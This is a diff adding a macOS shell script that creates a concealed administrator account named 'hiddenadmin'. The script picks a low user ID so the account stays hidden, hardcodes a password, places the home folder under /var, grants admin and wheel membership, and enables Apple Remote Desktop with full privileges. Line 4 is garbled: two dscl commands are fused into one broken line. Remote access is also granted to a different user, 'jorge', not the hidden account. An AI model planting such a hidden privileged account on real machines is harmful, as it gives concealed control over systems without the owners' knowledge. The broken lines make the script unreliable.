@@ -1,0 +1,21 @@
+
+ 
+# Create user record in directory services 
+dscl . -create /Users/hiddenadmindscl . -create /Users/hiddenadmin RealName "Hidden Administrator"
+dscl . -create /Users/hiddenadmin UniqueID 499 # Use something between 100 and 500 to hide user. 
+dscl . -create /Users/hiddenadmin PrimaryGroupID 20 
+dscl . -create /Users/hiddenadmin UserShell /bin/bash 
+dscl . -passwd /Users/hiddenadmin "e38TpBs1g;.r" # Obviously, use something else here 
+
+# Set up a hidden home folder 
+dscl . -create /Users/hiddenadmin NFSHomeDirectory /var/hiddenadmin
+cp -R /System/Library/User\ Template/English.lproj /var/hiddenadmin # Optional
+chown -R hiddenadmin: /var/hiddenadmin 
+
+
+# Grant admin & ARD rights 
+dseditgroup -o edit -a hiddenadmin -t user admin
+dseditgroup -o edit -a hiddenadmin -t user wheel  
+
+/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -users jorge -privs -all -restart -agent 
+
